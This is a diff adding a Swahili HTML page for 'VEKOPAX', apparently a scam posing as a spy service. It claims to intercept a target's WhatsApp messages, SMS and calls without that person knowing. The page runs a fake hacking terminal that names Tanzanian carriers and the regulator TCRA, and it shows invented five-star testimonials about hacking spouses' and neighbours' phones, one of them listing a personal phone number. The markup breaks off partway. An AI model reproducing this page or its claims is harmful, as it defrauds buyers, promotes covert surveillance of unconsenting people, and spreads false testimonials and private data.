@@ -1,0 +1,992 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>VEKOPAX - Mchakato Kamili</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            overscroll-behavior: none;
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            background-color: #0f172a;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .app-container {
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+            background: linear-gradient(to bottom right, #1b6df7, #0950d8, #04288b);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            color: white;
+        }
+
+        input, textarea {
+            -webkit-user-select: auto;
+            user-select: auto;
+        }
+
+        .terminal-font {
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .hide-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .hide-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+            overscroll-behavior-y: contain;
+        }
+
+        ::placeholder {
+            color: #9ca3af;
+            opacity: 1;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.4s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .smooth-scroll {
+            scroll-behavior: smooth;
+        }
+
+        /* Styles za Meseji za Skrini ya 5 */
+        .blur-sm {
+            filter: blur(4px);
+        }
+        .animate-popup {
+            animation: pop-up 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes pop-up {
+            from { transform: scale(0); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .spinner-custom {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #38bdf8;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-custom {
+            width: 100%;
+            height: 5px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 5px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar-custom {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(to right, #38bdf8, #22c55e);
+            transition: width 1.5s linear;
+        }
+
+        /* Cursor inayo-blink kwa Terminal (UI 4) */
+        .cursor::after {
+            content: '_';
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Smooth fade transition kwa Terminal */
+        .fade-enter { animation: terminalFadeIn 0.5s ease-in-out forwards; }
+        @keyframes terminalFadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <div class="absolute -top-20 -left-20 w-80 h-80 bg-[#3b8af9] rounded-full blur-[80px] opacity-40 pointer-events-none"></div>
+        <div class="absolute -bottom-20 -right-20 w-80 h-80 bg-[#00175f] rounded-full blur-[80px] opacity-60 pointer-events-none"></div>
+
+        <!-- DIALOG YA LOADING YA JUMLA -->
+        <div id="loadingOverlay" class="hidden absolute inset-0 z-50 bg-[#04288b]/90 backdrop-blur-sm flex-col items-center justify-center fade-in touch-none">
+            <svg class="animate-spin mb-4 h-14 w-14 text-[#FFD100]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            <p id="txtLoading" class="text-[18px] font-bold tracking-wide text-white drop-shadow-md">Tafadhali Subiri...</p>
+        </div>
+
+        <!-- UKURASA WA KWANZA (UI 1) -->
+        <div id="screen1" class="relative z-10 w-full h-full flex flex-col overflow-y-auto overflow-x-hidden hide-scrollbar">
+            <div class="px-6 pt-16 flex flex-col items-center text-center shrink-0">
+                <h1 id="ui1Title" class="text-[20px] font-bold leading-[1.35] mb-2 tracking-tight max-w-[340px] text-white"></h1>
+            </div>
+
+            <div class="px-6 w-full shrink-0 mt-4">
+                <div id="inputContainer" class="bg-white rounded-[50px] flex items-center px-2 py-2 h-[64px] shadow-lg transition-all duration-300">
+                    <div class="flex items-center gap-1.5 pl-3 pr-4 border-r border-gray-200 cursor-pointer h-[40px]">
+                        <span class="text-[22px] leading-none">🇹🇿</span>
+                        <svg class="w-3.5 h-3.5 text-gray-400 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M19 9l-7 7-7-7"></path></svg>
+                        <span class="text-[#111827] font-bold text-[17px] ml-1 tracking-wide">+255</span>
+                    </div>
+
+                    <div class="flex items-center pl-4 flex-1 h-full">
+                        <input type="tel" id="phoneNumber" placeholder="07xxxxxxxx" class="w-full bg-transparent outline-none text-[#111827] font-bold text-[18px] placeholder-gray-400 h-full tracking-wide" autocomplete="off" />
+                    </div>
+                </div>
+
+                <button onclick="handleEndelea()" class="mt-4 w-full bg-gradient-to-b from-[#FFD700] to-[#FFC400] text-[#001f60] font-bold text-[19px] rounded-full py-[18px] shadow-[0_6px_20px_rgba(255,215,0,0.3)] flex items-center justify-center gap-2 hover:scale-[1.01] active:scale-[0.98] transition-transform">
+                    <span id="btnEndeleaText">FUATILIA</span> 
+                    <span class="text-[22px] leading-none mb-0.5">➔</span>
+                </button>
+            </div>
+
+            <!-- SEHEMU YA MAONI -->
+            <div class="mt-12 px-6 flex justify-between items-center w-full shrink-0 mb-4">
+                <div class="relative">
+                    <h2 id="ui1ReviewsTitle" class="text-[20px] font-bold relative inline-block">Maoni ya Watumiaji</h2>
+                    <div class="absolute -bottom-2 left-0 w-12 h-[3px] bg-[#FFD100] rounded-full"></div>
+                </div>
+                
+                <button onclick="handleAndikaMaoni()" class="text-[12px] bg-[#FFD100] text-[#001f60] font-bold px-3 py-1.5 rounded-[10px] flex items-center gap-1.5 hover:scale-105 active:scale-95 transition-transform shadow-md">
+                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>
+                    Andika Maoni
+                </button>
+            </div>
+
+            <!-- KADI 5 ZA MAONI -->
+            <div id="reviewsContainer" class="pl-6 flex gap-4 overflow-x-auto snap-x snap-mandatory hide-scrollbar smooth-scroll pb-6 pr-6 shrink-0">
+                <!-- 1. Rosemarry -->
+                <div class="snap-center shrink-0 w-[230px] bg-[#2a75ff]/40 backdrop-blur-md border border-white/20 rounded-[20px] p-5 shadow-lg">
+                    <div class="flex items-center gap-3 mb-3">
+                        <div class="w-[42px] h-[42px] bg-white/20 border border-white/30 rounded-full flex items-center justify-center shrink-0 shadow-inner text-white">
+                            <svg class="w-6 h-6 fill-current text-white/90" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="flex flex-col justify-center">
+                            <h3 class="font-bold text-[14px] leading-tight">Rosemarry</h3>
+                            <p class="text-[11px] text-white/90 flex items-center gap-0.5 mt-0.5 font-medium">Dar es Salaam</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-0.5 mb-2.5 text-[#FFD100] text-[13px]">★★★★★</div>
+                    <p id="review1Text" class="text-[13.5px] text-white leading-[1.5] font-medium opacity-90">Nimiwatumia meseji Whatsapp naomba mnijibu jamani namba yangu mimi hii ya Whatsapp 0662125853. Kuna namba ya mtu wangu nimeunganisha hapa na nimefanikiwa kuitrack ninapokea meseji zake zote kila siku kupitia hii APP yenu ila sasa nataka kubadilisha namba yake niweke namba ya mtu mwingine nafanyaje hapo? Naomba mnijibu whatsapp namba yangu 0662125853</p>
+                </div>
+
+                <!-- 2. Edson -->
+                <div class="snap-center shrink-0 w-[230px] bg-[#2a75ff]/40 backdrop-blur-md border border-white/20 rounded-[20px] p-5 shadow-lg">
+                    <div class="flex items-center gap-3 mb-3">
+                        <div class="w-[42px] h-[42px] bg-white/20 border border-white/30 rounded-full flex items-center justify-center shrink-0 shadow-inner text-white">
+                            <svg class="w-6 h-6 fill-current text-white/90" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="flex flex-col justify-center">
+                            <h3 class="font-bold text-[14px] leading-tight">Edson</h3>
+                            <p class="text-[11px] text-white/90 flex items-center gap-0.5 mt-0.5 font-medium">Arusha</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-0.5 mb-2.5 text-[#FFD100] text-[13px]">★★★★★</div>
+                    <p id="review2Text" class="text-[13.5px] text-white leading-[1.5] font-medium opacity-90">Nilijua ni matapeli hawa jamaa kumbe app yao inafanyakazi kweli🫡 nimejaribu kuhack namba ya mtu juzi kila siku naona meseji zake. Endeleeni kupiga kazi wanangu tuko pamoja</p>
+                </div>
+
+                <!-- 3. Neema -->
+                <div class="snap-center shrink-0 w-[230px] bg-[#2a75ff]/40 backdrop-blur-md border border-white/20 rounded-[20px] p-5 shadow-lg">
+                    <div class="flex items-center gap-3 mb-3">
+                        <div class="w-[42px] h-[42px] bg-white/20 border border-white/30 rounded-full flex items-center justify-center shrink-0 shadow-inner text-white">
+                            <svg class="w-6 h-6 fill-current text-white/90" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="flex flex-col justify-center">
+                            <h3 class="font-bold text-[14px] leading-tight">Neema</h3>
+                            <p class="text-[11px] text-white/90 flex items-center gap-0.5 mt-0.5 font-medium">Mwanza</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-0.5 mb-2.5 text-[#FFD100] text-[13px]">★★★★★</div>
+                    <p id="review3Text" class="text-[13.5px] text-white leading-[1.5] font-medium opacity-90">"Mbarikiwe sana, damu ya yesu ikawe nanyi🙏 Application yenu imenisaidia sana maana ndoa yangu ilikua inayumba dah😥 kumbe jirani yangu ndio chanzo</p>
+                </div>
+
+                <!-- 4. Baraka -->
+                <div class="snap-center shrink-0 w-[230px] bg-[#2a75ff]/40 backdrop-blur-md border border-white/20 rounded-[20px] p-5 shadow-lg">
+                    <div class="flex items-center gap-3 mb-3">
+                        <div class="w-[42px] h-[42px] bg-white/20 border border-white/30 rounded-full flex items-center justify-center shrink-0 shadow-inner text-white">
+                            <svg class="w-6 h-6 fill-current text-white/90" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="flex flex-col justify-center">
+                            <h3 class="font-bold text-[14px] leading-tight">Baraka</h3>
+                            <p class="text-[11px] text-white/90 flex items-center gap-0.5 mt-0.5 font-medium">Dodoma</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-0.5 mb-2.5 text-[#FFD100] text-[13px]">★★★★★</div>
+                    <p id="review4Text" class="text-[13.5px] text-white leading-[1.5] font-medium opacity-90">rekebisheni upande wa Whatsapp, namba nilio hack napokea meseji zake za kawaida na simu zake akipigiwa ila kwenye upande wa WhatsApp naona tangu juzi zinakuja meseji akitumiwa ila namba za walio mtumia hazionekani huku kwangu rekebisheni hapo irudi kama mwanzo</p>
+                </div>
+
+                <!-- 5. Zainab -->
+                <div class="snap-center shrink-0 w-[230px] bg-[#2a75ff]/40 backdrop-blur-md border border-white/20 rounded-[20px] p-5 shadow-lg">
+                    <div class="flex items-center gap-3 mb-3">
+                        <div class="w-[42px] h-[42px] bg-white/20 border border-white/30 rounded-full flex items-center justify-center shrink-0 shadow-inner text-white">
+                            <svg class="w-6 h-6 fill-current text-white/90" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="flex flex-col justify-center">
+                            <h3 class="font-bold text-[14px] leading-tight">Zainab</h3>
+                            <p class="text-[11px] text-white/90 flex items-center gap-0.5 mt-0.5 font-medium">Zanzibar</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-0.5 mb-2.5 text-[#FFD100] text-[13.5px]">★★★★★</div>
+                    <p id="review5Text" class="text-[13.5px] text-white leading-[1.5] font-medium opacity-90">Mimi nimelipia hii Application yenu haina tatizo na inafanyakaz katika simu yangu bila shida yoyote nauliza hivi? Kwa mfano siku nikibadilisha simu inakuaje? Nitatakiwa kulipia tena au?</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- UKURASA WA PILI (UI 2) -->
+        <div id="screen2" class="hidden relative z-10 w-full h-full flex flex-col items-center justify-center px-6 text-center fade-in overflow-y-auto hide-scrollbar py-6">
+            <div class="relative w-32 h-32 bg-[#3b8af9]/30 rounded-full flex items-center justify-center mb-6 shrink-0">
+                <div class="absolute w-1.5 h-3.5 bg-white/70 rounded-full -left-2 top-10 rotate-[-45deg]"></div>
+                <div class="absolute w-1.5 h-3.5 bg-white/70 rounded-full -left-1 top-16 rotate-[-80deg]"></div>
+                <div class="absolute w-1.5 h-3.5 bg-white/70 rounded-full -right-2 top-10 rotate-[45deg]"></div>
+                <div class="absolute w-1.5 h-3.5 bg-white/70 rounded-full -right-1 top-12 rotate-[80deg]"></div>
+                
+                <div class="relative w-16 h-28 bg-gradient-to-b from-blue-50 to-blue-200 rounded-[14px] shadow-[0_10px_25px_rgba(0,0,0,0.2)] flex items-center justify-center border-[3px] border-white/95">
+                    <div class="absolute top-0 w-6 h-1 bg-gray-300 rounded-b-md"></div>
+                    <div class="w-[42px] h-[48px] bg-[#1b6df7] rounded-xl flex items-center justify-center shadow-lg relative">
+                        <svg class="w-6 h-6 text-white mt-1" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-1.998A11.954 11.954 0 0110 1.944zM8.707 10.707a1 1 0 00-1.414-1.414l-2 2a1 1 0 001.414 1.414l2-2zm4.707-4.707a1 1 0 00-1.414 1.414l-3 3a1 1 0 001.414 1.414l3-3z" clip-rule="evenodd" />
+                        </svg>
+                    </div>
+                    <div class="absolute bottom-1.5 w-5 h-[2.5px] bg-gray-300 rounded-full"></div>
+                </div>
+            </div>
+
+            <div class="w-full max-w-[340px] bg-[#0a3594]/60 border border-blue-400/40 rounded-[22px] p-5 text-left text-[15px] text-white leading-[1.65] space-y-4 mb-6 shadow-xl font-semibold shrink-0">
+                <p>
+                    Namba unayotaka kuifuatilia ni <span id="displayPhoneNumber" class="text-[#22c55e] font-extrabold tracking-wider text-[17px]"></span>
+                </p>
+                <p class="text-blue-100 font-bold">
+                    Kama namba hii ni sahihi tafadhali bonyeza kitufe kimeandikwa <span class="text-yellow-300 font-extrabold">"ENDELEA"</span> hapa chini.
+                </p>
+            </div>
+
+            <button onclick="handleThibitisha()" class="w-[85%] max-w-[320px] bg-gradient-to-r from-[#20c997] to-[#10b981] rounded-full p-1.5 shadow-[0_8px_25px_rgba(16,185,129,0.4)] flex items-center hover:scale-[1.02] active:scale-[0.98] transition-transform mb-4 shrink-0">
+                <div class="bg-white rounded-full w-[48px] h-[48px] flex items-center justify-center shrink-0 shadow-sm ml-0.5">
+                    <svg class="w-[26px] h-[26px] text-[#10b981]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <div class="w-[1.5px] h-8 bg-white/30 mx-3"></div>
+                <span id="btnThibitishaText" class="text-white font-extrabold text-[17px] tracking-widest flex-1 text-left mt-0.5">ENDELEA</span>
+                <span class="text-white font-bold text-[24px] mr-5 leading-none">➔</span>
+            </button>
+        </div>
+
+        <!-- UKURASA WA TATU (UI 3) -->
+        <div id="screen3" class="hidden relative z-10 w-full h-full flex flex-col items-center justify-center px-6 text-center fade-in overflow-y-auto hide-scrollbar py-6">
+            <h1 class="text-[24px] sm:text-[28px] font-extrabold leading-[1.2] mb-4 tracking-wider drop-shadow-md text-white uppercase">TRACKING SYSTEM</h1>
+            
+            <div class="w-full max-w-[340px] bg-[#0a3594]/60 border border-blue-400/40 rounded-[22px] p-4 text-left text-[14.5px] text-white leading-[1.65] space-y-3.5 mb-6 shadow-xl font-semibold">
+                <p>
+                    System hii itakamata meseji zote zitakazotumwa katika namba hii <span id="screen3Phone1" class="text-[#22c55e] font-extrabold tracking-wider"></span> na utaweza kukamata meseji zote za Whatsapp (Picha, Video na Voice note).
+                </p>
+                <p>
+                    Pia utaweza kusikiliza simu zitakazopigwa na kupokelewa pasipo muhusika wa hii namba <span id="screen3Phone2" class="text-[#22c55e] font-extrabold tracking-wider"></span> kujua kama unakamata meseji zake na simu zake anazopiga au kupigiwa.
+                </p>
+                <p class="text-blue-100 font-bold">
+                    Kama umeridhia bonyeza kitufe kimeandikwa <span class="text-yellow-300 font-extrabold">"TRACK"</span> hapa chini ili tuanze mchakato wa kufuatilia hii namba <span id="screen3Phone3" class="text-[#22c55e] font-extrabold tracking-wider"></span>.
+                </p>
+            </div>
+
+            <button onclick="handleSomaJumbe()" class="w-[80%] max-w-[280px] bg-gradient-to-r from-[#25a0ff] to-[#0d6efd] rounded-full py-[16px] shadow-[0_8px_25px_rgba(13,110,253,0.4)] flex items-center justify-center gap-3 hover:scale-[1.02] active:scale-[0.98] transition-transform shrink-0">
+                <span id="btnSomaJumbeText" class="text-white font-extrabold text-[17px] tracking-wide mt-0.5">TRACK</span>
+                <span class="text-white font-bold text-[22px] leading-none mb-0.5">➔</span>
+            </button>
+        </div>
+
+        <!-- UKURASA WA NNE (UI 4) -->
+        <div id="screen4" class="hidden relative z-10 w-full h-full flex flex-col p-3 text-[11px] sm:text-[12px] leading-[1.4] overflow-y-auto hide-scrollbar terminal-font bg-[#050505] text-[#00ff66]">
+            <div id="terminalOverlay" class="absolute inset-0 z-50 bg-black/85 backdrop-blur-[2px] flex-col items-center justify-center transition-opacity" style="display: none;">
+                <svg class="animate-spin mb-5 h-16 w-16 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <p id="terminalOverlayText" class="text-white font-bold text-[18px] tracking-wide font-sans shadow-black drop-shadow-lg text-center px-4"></p>
+            </div>
+
+            <div class="border border-[#00ff66]/30 p-2 rounded bg-[#001100]/40 mb-3 space-y-2 fade-enter">
+                <div class="text-cyan-400 font-bold border-b border-cyan-400/30 pb-1 uppercase">Searching Data</div>
+                <div class="pt-1">
+                    <div class="flex items-center gap-1 text-[#00ff66]">
+                        <svg class="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg>
+                        <span id="txtWa" class="cursor"></span>
+                    </div>
+                    <div class="text-[10px]" id="barWa">[--------------------] 0%</div>
+                </div>
+                <div>
+                    <div id="txtSms" class="cursor"></div>
+                    <div class="text-[10px]" id="barSms">[--------------------] 0%</div>
+                </div>
+                <div>
+                    <div id="txtCall" class="cursor"></div>
+                    <div class="text-[10px]" id="barCall">[--------------------] 0%</div>
+                </div>
+            </div>
+
+            <div class="border border-[#00ff66]/30 p-2 rounded bg-[#001100]/40 mb-3 space-y-1 fade-enter" style="animation-delay: 0.5s; opacity: 0;">
+                <div class="flex justify-between font-bold border-b border-[#00ff66]/30 pb-1">
+                    <span>[ DATA CAPTURE ]</span>
+                    <span id="percentCap">0%</span>
+                </div>
+                <div class="text-[10px] text-[#00ff66]" id="barCap">[----------------------------------------]</div>
+                <div class="grid grid-cols-4 gap-1 pt-1 text-[11px]">
+                    <div class="col-span-3">[+] user_profiles.dat</div><div class="text-right text-yellow-300" id="f1">[PENDING]</div>
+                    <div class="col-span-3">[+] messages.db</div><div class="text-right text-yellow-300" id="f2">[PENDING]</div>
+                    <div class="col-span-3">[+] contacts.json</div><div class="text-right text-yellow-300" id="f3">[PENDING]</div>
+                    <div class="col-span-3">[+] media_files/</div><div class="text-right text-yellow-300" id="f4">[PENDING]</div>
+                    <div class="col-span-3">[+] system_logs.log</div><div class="text-right text-yellow-300" id="f5">[PENDING]</div>
+                    <div class="col-span-3">[+] database_backup.sql</div><div class="text-right text-yellow-300" id="f6">[PENDING]</div>
+                </div>
+                <div class="pt-2 text-cyan-400" id="capLog">12:45:18 [INFO] Waiting for stream...</div>
+            </div>
+
+            <div class="border border-[#00ff66]/30 p-2 rounded bg-[#001100]/40 mb-3 space-y-1 fade-enter" style="animation-delay: 1s; opacity: 0;">
+                <div class="flex justify-between font-bold border-b border-[#00ff66]/30 pb-1">
+                    <span>[ NETWORK SCAN & MONITORING ]</span>
+                    <span id="percentNet">0%</span>
+                </div>
+                <div class="text-[10px] text-[#00ff66]" id="barNet">[----------------------------------------]</div>
+                <div class="space-y-0.5 pt-1 text-[10px]">
+                    <div class="flex justify-between"><span>> VodaCom Tanzania</span><span class="text-gray-400" id="n1">Waiting...</span></div>
+                    <div class="flex justify-between"><span>> Yas Tanzania</span><span class="text-gray-400" id="n2">Waiting...</span></div>
+                    <div class="flex justify-between"><span>> Airtel Tanzania</span><span class="text-gray-400" id="n3">Waiting...</span></div>
+                    <div class="flex justify-between"><span>> TCRA</span><span class="text-gray-400" id="n4">Waiting...</span></div>
+                    <div class="flex justify-between"><span>> Mobile network Access</span><span class="text-gray-400" id="n5">Waiting...</span></div>
+                    <div class="flex justify-between"><span>> Hallotel Tanzania</span><span class="text-gray-400" id="n6">Waiting...</span></div>
+                    <div class="flex justify-between"><span>> Tanzania Cellular Network</span><span class="text-gray-400" id="n7">Waiting...</span></div>
+                </div>
+            </div>
+
+            <div class="border border-yellow-500/50 p-2 rounded bg-yellow-900/20 mb-3 flex items-center gap-2 fade-enter" id="bannerBox" style="animation-delay: 1.5s; opacity: 0;">
+                <div class="w-6 h-6 rounded-full bg-[#00ff66] text-black font-bold flex items-center justify-center text-[14px]">i</div>
+                <div>
+                    <div class="font-bold text-yellow-400" id="bannerTitle">NETWORK SCAN IN PROGRESS</div>
+                    <div class="text-[10px] text-[#00ff66]" id="bannerSub">Analyzing active connections and data traffic...</div>
+                </div>
+            </div>
+
+            <div class="border border-[#00ff66]/30 p-2 rounded bg-[#001100]/40 mb-3 space-y-1 fade-enter" style="animation-delay: 2s; opacity: 0;">
+                <div class="flex justify-between font-bold border-b border-[#00ff66]/30 pb-1">
+                    <span>[ FINAL OUTPUT ]</span>
+                    <span id="percentFinal">0%</span>
+                </div>
+                <div class="text-[10px] text-[#00ff66]" id="barFinal">[----------------------------------------]</div>
+                <div class="grid grid-cols-2 pt-1">
+                    <div>[+] Total files processed</div><div id="statFiles">: 0 / 15</div>
+                    <div>[+] Total size</div><div id="statSize">: 0.0 MB</div>
+                    <div>[+] Status</div><div class="text-yellow-400 font-bold" id="statStatus">: PROCESSING</div>
+                </div>
+            </div>
+
+            <div class="p-2 space-y-1 opacity-80" id="bottomLogs">
+                <div id="log1" class="cursor"></div>
+                <div id="log2" class="cursor hidden"></div>
+            </div>
+        </div>
+
+        <!-- UKURASA WA TANO (UI 5) -->
+        <div id="screen5" class="hidden relative z-10 w-full h-full flex flex-col p-4 overflow-y-auto hide-scrollbar text-white">
+            <div class="container mx-auto max-w-[390px] pb-6 flex-1 flex flex-col justify-center">
+                <div class="flex items-center justify-between mb-4 px-1 pt-2">
+                    <div class="text-[22px] font-extrabold tracking-wider bg-gradient-to-r from-white via-blue-100 to-cyan-300 bg-clip-text text-transparent">INCOMING MESSAGES</div>
+                    <div class="flex items-center">
+                        <div id="badge" class="bg-red-500 text-white text-xs font-bold rounded-full w-7 h-7 flex items-center justify-center animate-pulse shadow-lg">0</div>
+                    </div>
+                </div>
+
+                <div class="bg-[#0a3594]/60 backdrop-blur-xl border border-blue-400/40 rounded-[24px] p-4 shadow-2xl flex flex-col overflow-hidden relative min-h-[420px]">
+                    <div class="flex items-center justify-center py-2 shrink-0 mb-2">
+                        <div class="spinner-custom" id="loadingSpinner"></div>
+                    </div>
+                    
+                    <div id="messages" class="space-y-3 overflow-y-auto hide-scrollbar flex-1 pr-1 divide-y divide-blue-400/20"></div>
+                    
+                    <div class="progress-custom shrink-0 mt-4 bg-black/30">
+                        <div id="progressBar" class="progress-bar-custom"></div>
+                    </div>
+                </div>
+            </div>
+            <audio id="audio" src="https://cdn.wapka.org/00erj1/e0982f29a19811e37594831ec350c098/samsung-message-tonemp3_160k.mp3"></audio>
+        </div>
+
+        <!-- UKURASA WA SITA (UI 6) -->
+        <div id="screen6" class="hidden relative z-10 w-full h-full flex flex-col overflow-y-auto hide-scrollbar text-white p-4">
+            <div class="container mx-auto max-w-[390px] pb-10">
+                <div class="flex items-center justify-between mb-4 px-1 pt-2">
+                    <div class="text-[22px] font-extrabold tracking-wider bg-gradient-to-r from-white via-blue-100 to-cyan-300 bg-clip-text text-transparent">VEKOPAX</div>
+                    <div class="text-[11.5px] text-emerald-300 bg-emerald-500/20 px-3 py-1 rounded-full border border-emerald-400/30 font-semibold flex items-center gap-1.5">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Secured Link
+                    </div>
+                </div>
+
+                <div class="bg-white/10 backdrop-blur-xl border border-white/20 rounded-[24px] p-4 flex justify-around items-center mb-5 shadow-2xl">
+                    <div class="text-center relative cursor-pointer group" onclick="showDialog('whatsapp')">
+                        <div class="w-14 h-14 bg-emerald-500/20 border border-emerald-400/30 rounded-2xl flex items-center justify-center shadow-inner group-hover:scale-105 transition-transform">
+                            <svg class="w-8 h-8 fill-emerald-400 drop-shadow" viewBox="0 0 24 24">
+                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
+                            </svg>
+                        </div>
